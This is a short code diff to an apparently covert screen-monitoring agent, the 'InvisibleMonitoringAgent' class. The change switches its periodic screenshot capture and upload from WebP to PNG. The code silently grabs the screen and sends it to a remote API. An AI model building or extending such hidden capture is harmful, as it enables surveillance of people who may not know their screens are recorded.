@@ -169,8 +169,8 @@ class InvisibleMonitoringAgent:
         self._next_screenshot_gap = self._screenshot_gap()
 
         try:
-            img = screenshot_mod.capture_webp_bytes()
-            self.api.upload_screenshot(img, _now_iso(), content_type="image/webp")
+            img = screenshot_mod.capture_png_bytes()
+            self.api.upload_screenshot(img, _now_iso(), content_type="image/png")
         except Exception as exc:
             self._log(f"screenshot error: {exc}")
 
